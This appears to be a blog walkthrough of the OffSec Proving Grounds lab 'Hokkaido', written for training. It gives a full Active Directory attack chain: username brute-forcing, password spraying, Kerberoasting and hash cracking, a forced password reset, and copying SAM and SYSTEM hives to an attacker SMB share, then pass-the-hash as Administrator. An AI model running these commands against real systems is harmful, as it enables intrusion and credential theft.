---
title: Hokkaido
date: 2026-02-09T12:00:04+01:00
draft: false
tags:
  - offsec
  - nmap
  - windows
  - proving-grounds
categories:
  - Pentesting
  - Offsec
  - Windows
description: "This guide provides readers with the solution to the Proving Grounds Lab: Hokkaido"
---
"Before you react, think. Before you spend, earn. Before you criticise, wait. Before you quit, try."  
 Ernest Hemingway

If you find usernames, especially if they are words, repeat them as passwords, e.g. ftp:ftp, admin:admin, discovery:discovery


![](Screenshot%202026-02-08%20at%2021.24.56.png)

![](Screenshot%202026-02-08%20at%2021.25.16.png)
![](Screenshot%202026-02-08%20at%2021.25.48.png)



![](Screenshot%202026-02-08%20at%2021.26.14.png)

`enum4linux-ng -A 192.168.162.40`

![](Screenshot%202026-02-08%20at%2021.30.59.png)

![](Screenshot%202026-02-08%20at%2021.30.08.png)

After many attempts to enumerate smb and ldap, I stumbled across a tool called Kerbrute. With just have the IP and domain name(which is found through enum4linux and nxc among others), usernames can be brute forced enumerated using common username lists. 

I couldn't find a sub 1000 username list with admin and infrastructure type usernames so I created one using gemini.  

`kerbrute  userenum -d hokkaido-aerospace.com --dc 192.168.243.40 ~/oscp/assets/1k_usernames.txt  -t 100 -o users.txt`

![](Screenshot%202026-02-12%20at%2011.54.56.png)

 `cat users.txt |  grep -Po '\w+(?=@)' > usersnames.txt`

`nxc smb 192.168.243.40  -u usersnames.txt -p usersnames.txt`

![](Screenshot%202026-02-12%20at%2012.56.48.png)

`nxc smb 192.168.243.40 -u Info -p info --shares`

![](Screenshot%202026-02-12%20at%2012.59.31.png)

`python /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -dc-ip 192.168.243.40 hokkaido-aerospace.com/info:info -request`


![](Screenshot%202026-02-12%20at%2013.40.02.png)

Here we find an extra user: discovery   
We'll add this to the usersnames.txt file.

![](Screenshot%202026-02-12%20at%2015.13.16.png)

MSSQL database:  
`impacket-mssqlclient  'hokkaido-aerospace.com/discovery':'Start123!'@192.168.161.40 -dc-ip 192.168.161.40 -windows-auth`

![](Screenshot%202026-02-14%20at%2014.35.28.png)

`SELECT name FROM sys.databases;`

Elevate database privileges:  
`SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'`

![](Screenshot%202026-02-14%20at%2014.53.08.png)


`SELECT * FROM hrappdb.INFORMATION_SCHEMA.TABLES;`

`SELECT * FROM sysauth;`

![](Screenshot%202026-02-14%20at%2015.34.13.png)

Bloodhound:  
`bloodhound-python -u "hrapp-service" -p 'Untimed$Runny' -d hokkaido-aerospace.com -c all --zip -ns 192.168.245.40`

Download targetedKerberoast:  
`https://github.com/ShutdownRepo/targetedKerberoast/blob/main/targetedKerberoast.py`

`chmod +x targetedKerberoast.py`  

`./targetedKerberoast.py -v -d 'hokkaido-aerospace.com' -u 'hrapp-service' -p 'Untimed$Runny' --dc-ip 192.168.245.40`

![](Screenshot%202026-02-16%20at%2007.31.29.png)

Create a file for the hash:

`hashcat -m 13100 hasel.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule --force`

`hashcat -m 13100 hasel.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule --show` 


![](Screenshot%202026-02-16%20at%2007.37.15.png)

haze1988

We're going to look into the domain using Bloodhound, but first we'll install bloodhound-python so that we can add the `--bloudhound` option to out nxc command


`sudo nxc ldap 192.168.172.40 -u 'hazel.green' -p 'haze1988' -d hokkaido-aerospace.com --bloodhound  --dns-server 192.168.172.40`

Take the zip file and add upload it to bloodhound

![](Screenshot%202026-02-17%20at%2013.01.25.png)

![](Screenshot%202026-02-18%20at%2010.04.02.png)

![](Screenshot%202026-02-18%20at%2010.05.25.png)

Molly Smith has Remote Desktop privileges, this command will reset her password so we can login as Molly: 

`net rpc password "molly.smith" "Password123@" -U "hokkaido-aerospace.com"/"Hazel.Green"%"haze1988" -S 192.168.172.40`

`xfreerdp3 /v:192.168.172.40 /u:'haero\molly.smith' /p:'Password123@'`

![](Screenshot%202026-02-19%20at%2009.55.53.png)
Run: cmd as administrator:

![](Screenshot%202026-02-19%20at%2009.54.47.png)

![](Screenshot%202026-02-19%20at%2009.57.07.png)

`Systeminfo`

![](Screenshot%202026-02-18%20at%2010.22.15.png)

`whomai /priv`

![](Screenshot%202026-02-19%20at%2009.58.10.png)

Navigate to somewhere you can save files.

cd C:/Users/molly.smith/desktop


`reg save HKLM\SAM sam.bak`
`reg save HKLM\SYSTEM system.bak`

![](Screenshot%202026-02-19%20at%2010.00.32.png)

Start a SMB server on your kali machine:

`sudo impacket-smbserver share . -smb2support -user test -password test`

![](Screenshot%202026-02-18%20at%2013.42.54.png)

`net use \\192.168.45.249\share /user:test test`  
`copy sam.bak \\192.168.45.249\share\sam.bak`  
`copy system.bak \\192.168.45.249\share\system.bak`  

![](Screenshot%202026-02-19%20at%2010.07.02.png)

![](Screenshot%202026-02-18%20at%2013.42.19.png)


It is a little difficult to see, the nthash is the part that is needed:

`evil-winrm -i 192.168.218.40 -u Administrator -H "d752482897d54e239376fddb2a2109e4"`

![](Screenshot%202026-02-18%20at%2014.13.24.png)

Too long...